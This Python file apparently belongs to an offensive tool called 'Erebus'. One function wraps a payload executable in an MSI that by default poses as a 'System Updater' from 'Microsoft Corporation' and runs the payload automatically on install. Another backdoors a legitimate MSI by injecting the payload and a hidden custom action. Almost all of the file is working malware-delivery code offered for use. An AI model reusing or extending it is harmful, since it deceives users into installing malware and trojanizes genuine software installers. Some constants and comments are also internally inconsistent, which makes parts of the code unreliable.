"""
MSI Container Generator for Erebus Payload
Features:
- Admin (Machine) vs User (No-Admin) install scopes
- Auto-execution via CustomAction
- Dependency bundling
- MSI Hijacking (backdooring existing MSI installers)
"""

import pathlib
import subprocess
import uuid
import tempfile
import shutil
import sys

if sys.platform == "win32":
    try:
        import msilib
    except ImportError:
        msilib = None


def build_msi(build_path: pathlib.Path,
              app_name: str = "System Updater",
              manufacturer: str = "Microsoft Corporation",
              install_scope: str = "User") -> pathlib.Path:
    """
    Wraps the payload into an MSI.

    Args:
        app_name (str): Name of the Application
        manufacturer (str): Name of the manufacturer
        install_scope (str): "User" (No Admin, AppData) or "Machine" (Admin, ProgramFiles)
    """
    version = "1.0.0.0"
    upgrade_code = str(uuid.uuid4())
    component_guid = str(uuid.uuid4())

    payload_dir = build_path / "payload"
    payload_exe = payload_dir / "erebus.exe"
    if not payload_exe.exists():
        try:
            payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
        except StopIteration:
            raise RuntimeError("No .exe payload found in payload directory!")

    msi_path = build_path / "container" / "msi" / "erebus.msi"
    msi_path.parent.mkdir(parents=True, exist_ok=True)

    if install_scope.lower() == "machine":
        target_dir_id = "ProgramFilesFolder"
        package_scope = 'InstallScope="perMachine"'
        root_dir_name = "SourceDir"
    else:
        target_dir_id = "LocalAppDataFolder"
        package_scope = 'InstallScope="perUser"'
        root_dir_name = "SourceDir"

    files_xml = ""
    main_exe_id = "PayloadEXE"

    for file in payload_dir.iterdir():
        if file.is_file() and file.name != msi_path.name:
            file_id = f"File_{uuid.uuid4().hex[:8]}"
            is_main = (file.name == payload_exe.name)

            if is_main:
                current_id = main_exe_id
                keypath = ''
            else:
                current_id = file_id
                keypath = ''

            files_xml += f'<File Id="{current_id}" Source="{file.absolute()}" {keypath} />\n'

    wix_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="{upgrade_code}" Name="{app_name}" Version="{version}" Manufacturer="{manufacturer}" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" Comments="Installer" {package_scope} />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />

        <Directory Id="TARGETDIR" Name="{root_dir_name}">
            <Directory Id="{target_dir_id}">
                <Directory Id="INSTALLLOCATION" Name="{app_name}">
                    <Component Id="MainComponent" Guid="{component_guid}">
                        <!-- Critical for Per-User installs to create the folder key -->
                        <RegistryValue Root="HKCU" Key="Software\\{manufacturer}\\{app_name}" Name="installed" Type="integer" Value="1" KeyPath="yes"/>
                        {files_xml}
                    </Component>
                </Directory>
            </Directory>
        </Directory>

        <Feature Id="ProductFeature" Title="{app_name}" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>

        <CustomAction Id="LaunchApp" FileKey="{main_exe_id}" ExeCommand="" Return="asyncNoWait" />

        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize">NOT Installed</Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>
"""

    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            wxs_path = pathlib.Path(temp_dir) / "installer.wxs"
            wxs_path.write_text(wix_xml, encoding="utf-8")

            cmd = ["wixl", "-o", str(msi_path), str(wxs_path)]
            subprocess.check_output(cmd, stderr=subprocess.STDOUT)

            if not msi_path.exists():
                raise RuntimeError("MSI file was not created.")
            return msi_path

    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"MSI Build Failed:\n{e.output.decode()}")


def hijack_msi(source_msi: pathlib.Path, 
               payload_path: pathlib.Path,
               build_path: pathlib.Path,
               custom_action_name: str = "ErebusPayload") -> pathlib.Path:
    """
    Hijacks an existing MSI installer by injecting a CustomAction to execute our payload.
    
    Args:
        source_msi (pathlib.Path): Path to the original MSI installer
        payload_path (pathlib.Path): Path to the payload executable/DLL to inject
        build_path (pathlib.Path): Build directory for output
        custom_action_name (str): Name for the custom action
        
    Returns:
        pathlib.Path: Path to the backdoored MSI
    """
    if not source_msi.exists():
        raise FileNotFoundError(f"Source MSI not found: {source_msi}")
    
    if not payload_path.exists():
        raise FileNotFoundError(f"Payload not found: {payload_path}")
    
    # Create output directory
    msi_output_dir = build_path / "container" / "msi"
    msi_output_dir.mkdir(parents=True, exist_ok=True)
    
    # Copy source MSI to output location
    backdoored_msi = msi_output_dir / f"{source_msi.stem}-backdoored.msi"
    shutil.copy2(source_msi, backdoored_msi)
    
    # Platform-specific MSI manipulation
    if sys.platform == "win32" and msilib is not None:
        try:
            # Open the MSI database
            db = msilib.OpenDatabase(str(backdoored_msi), msilib.MSIDBOPEN_TRANSACT)
            
            # Step 1: Add the payload binary to the Binary table
            view = db.OpenView("SELECT * FROM Binary")
            view.Execute(None)
            
            binary_name = f"Payload_{uuid.uuid4().hex[:8]}"
            with open(payload_path, "rb") as f:
                payload_data = f.read()
            
            # Insert into Binary table
            binary_insert = f"INSERT INTO Binary (Name, Data) VALUES ('{binary_name}', ?)"
            view_insert = db.OpenView(binary_insert)
            record = msilib.CreateRecord(1)
            record.SetStream(1, str(payload_path))
            view_insert.Execute(record)
            view_insert.Close()
            
            # Step 2: Add CustomAction entry
            # Type 1250 = msidbCustomActionTypeDll (1024) + msidbCustomActionTypeHideTarget (32) + 
            #             msidbCustomActionTypeInScript (1024) + msidbCustomActionTypeBinaryData (0)
            # For EXE: Type 34 = msidbCustomActionTypeExe (2) + msidbCustomActionTypeBinaryData (0) + msidbCustomActionTypeContinue (32)
            is_dll = payload_path.suffix.lower() == ".dll"
            action_type = 1250 if is_dll else 34
            
            ca_insert = f"""INSERT INTO CustomAction (Action, Type, Source, Target) 
                           VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '')"""
            view_ca = db.OpenView(ca_insert)
            view_ca.Execute(None)
            view_ca.Close()
            
            # Step 3: Add to InstallExecuteSequence
            # Find an available sequence number between PublishProduct (6400) and InstallFinalize (6600)
            sequence_num = 6599
            
            ies_insert = f"""INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) 
                            VALUES ('{custom_action_name}', 'NOT REMOVE', {sequence_num})"""
            view_ies = db.OpenView(ies_insert)
            view_ies.Execute(None)
            view_ies.Close()
            
            # Commit changes
            db.Commit()
            db.Close()
            
            return backdoored_msi
            
        except Exception as e:
            raise RuntimeError(f"Failed to hijack MSI using msilib: {str(e)}")
    
    else:
        # Use msitools for Linux
        try:
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = pathlib.Path(temp_dir)
                
                # Use msiinfo to add entries directly to the MSI database
                binary_name = f"Payload_{uuid.uuid4().hex[:8]}"
                is_dll = payload_path.suffix.lower() == ".dll"
                action_type = 1250 if is_dll else 34
                
                # Step 1: Add payload to Binary table using msiinfo
                # msiinfo requires streams to be added with -s option
                subprocess.check_call([
                    "msiinfo", "streams", "-a", binary_name,
                    str(payload_path), str(backdoored_msi)
                ])
                
                # Step 2: Create SQL script for CustomAction and InstallExecuteSequence
                sql_script = temp_path / "modify.sql"
                sql_content = f"""INSERT INTO `CustomAction` (`Action`, `Type`, `Source`, `Target`) VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '')
INSERT INTO `InstallExecuteSequence` (`Action`, `Condition`, `Sequence`) VALUES ('{custom_action_name}', 'NOT REMOVE', 6599)
"""
                sql_script.write_text(sql_content)
                
                # Step 3: Apply SQL modifications to MSI tables
                # Use msiinfo export/import to modify tables
                result = subprocess.run([
                    "msiinfo", "execute", str(backdoored_msi), str(sql_script)
                ], capture_output=True, text=True)
                
                if result.returncode != 0:
                    # Fallback: Try using msibuild approach
                    # Export tables, modify them, and rebuild
                    tables_dir = temp_path / "tables"
                    tables_dir.mkdir()
                    
                    # Export existing tables
                    for table in ["CustomAction", "InstallExecuteSequence"]:
                        try:
                            output = subprocess.check_output([
                                "msiinfo", "export", str(backdoored_msi), table
                            ], text=True)
                            (tables_dir / f"{table}.idt").write_text(output)
                        except subprocess.CalledProcessError:
                            # Table might not exist, create it
                            pass
                    
                    # Append CustomAction entry
                    ca_file = tables_dir / "CustomAction.idt"
                    ca_content = ca_file.read_text() if ca_file.exists() else ""
                    if not ca_content.endswith("\n"):
                        ca_content += "\n"
                    ca_content += f"{custom_action_name}\t{action_type}\t{binary_name}\t\n"
                    ca_file.write_text(ca_content)
                    
                    # Append InstallExecuteSequence entry
                    ies_file = tables_dir / "InstallExecuteSequence.idt"
                    ies_content = ies_file.read_text() if ies_file.exists() else ""
                    if not ies_content.endswith("\n"):
                        ies_content += "\n"
                    ies_content += f"{custom_action_name}\tNOT REMOVE\t6590\n"
                    ies_file.write_text(ies_content)
                    
                    # Import modified tables back
                    for table_file in tables_dir.glob("*.idt"):
                        subprocess.check_call([
                            "msiinfo", "import", str(backdoored_msi), str(table_file)
                        ])
                
                return backdoored_msi
                
        except subprocess.CalledProcessError as e:
            stderr = e.stderr if hasattr(e, 'stderr') and e.stderr else ""
            stdout = e.stdout if hasattr(e, 'stdout') and e.stdout else ""
            raise RuntimeError(f"Failed to hijack MSI using msitools: {str(e)}\nStdout: {stdout}\nStderr: {stderr}")
        except FileNotFoundError:
            raise RuntimeError("msitools not found. Install with: apt-get install msitools")
